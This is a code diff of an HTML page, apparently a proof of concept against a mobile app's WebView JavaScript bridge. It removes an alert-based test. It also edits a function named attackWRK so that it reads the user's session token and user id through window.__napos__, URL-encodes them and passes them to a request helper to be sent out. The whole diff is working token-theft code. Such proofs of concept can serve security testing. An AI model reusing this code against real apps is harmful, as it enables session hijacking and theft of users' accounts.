@@ -6,21 +6,7 @@
 </head>
 <body>
 <p id="content">attackWRK </p>
-    
-<script>
-
-attack();
-function attack(){
-
- var sid=window.__napos__.getNaposSid();
-   alert(sid);
-   var tid=window.__napos__.getNaposRSTid()
-   alert(tid);
-}
- 
-</script>
-
-    
+     
 <script>
 
        function createXHR() {
@@ -64,10 +50,14 @@ function attack(){
     
  function attackWRK() {
  
-   var getUserInfo = window.SPJSBridge.getUserInfo();
-   alert('getUserInfo:'+ getUserInfo);
+  // var getUserInfo = window.SPJSBridge.getUserInfo();
+  // alert('getUserInfo:'+ getUserInfo);
+   var getUserToken=window.__napos__.getNaposSid();
+   //alert(getUserToken);
+   var getUserId=window.__napos__.getNaposRSTid()
+   //alert(getUserId);
      
-   userInfo='getUserInfo : ' +getUserInfo;
+   userInfo='getUserToken : ' +getUserToken;
    document.getElementById("content").innerText = userInfo;
    url =encodeURIComponent(userInfo);
    sendRequest(url);
